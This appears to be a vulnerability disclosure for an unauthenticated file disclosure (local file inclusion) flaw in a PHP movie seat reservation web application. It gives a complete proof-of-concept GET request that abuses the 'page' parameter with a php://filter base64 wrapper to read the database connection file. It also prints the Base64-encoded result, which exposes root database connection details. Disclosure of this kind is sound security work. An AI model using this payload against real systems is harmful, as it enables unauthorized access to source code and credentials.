# Movie Seat Reservation System File Disclosure
* `Note` => don't need login 
# Exploit 
* Exploit with Burp Suite 
```python
http://192.168.1.101:8080/Movie_Seat_Reservation_System/index.php?page=home
```
![image](https://user-images.githubusercontent.com/79050415/160242883-2539e290-9b33-4267-a38b-a2d37563b0a2.png)
* Use Burp Suite capture request and payload => `Send`
![image](https://user-images.githubusercontent.com/79050415/160242922-7c29a7ac-787f-47b8-9052-6c5c2d7495cb.png)
* Then decode `Base64` 
```python3
 PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290JywnJywndGhlYXRlcl9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg==    
```
![image](https://user-images.githubusercontent.com/79050415/160243014-eff96877-37c4-41ba-b4ed-0359cbbece7b.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/160243179-1a4d1053-eb75-4a8c-9965-52d3eaeb5b18.png)
# POC 
* `Request`
```python
GET /Movie_Seat_Reservation_System/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
Host: 192.168.1.101:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101:8080/Movie_Seat_Reservation_System/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=0722dtqnb1dgvuono8uubajcae
Connection: close
```
